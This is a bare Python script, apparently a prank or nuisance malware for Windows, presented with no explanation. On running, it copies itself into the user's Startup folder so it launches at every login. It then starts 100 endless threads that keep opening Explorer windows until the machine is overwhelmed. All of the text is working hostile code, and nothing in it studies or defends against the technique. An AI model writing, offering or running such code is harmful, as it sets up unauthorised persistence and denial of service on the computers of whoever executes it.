import shutil
import os
import subprocess
import string
import threading
def c():
    while True:
        for i in string.ascii_uppercase:
            if os.path.exists(i+":\\"):
                subprocess.Popen("explorer /select,"+i+":\\")
                break
shutil.move(__file__,os.environ["APPDATA"]+"\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"+__file__.split("\\")[-1])
ts=[]
for a in range(100):
    t=threading.Thread(target=c)
    t.daemon=True
    ts.append(t)
for a in range(100):
    ts[a].start()
for a in range(100):
    ts[a].join()
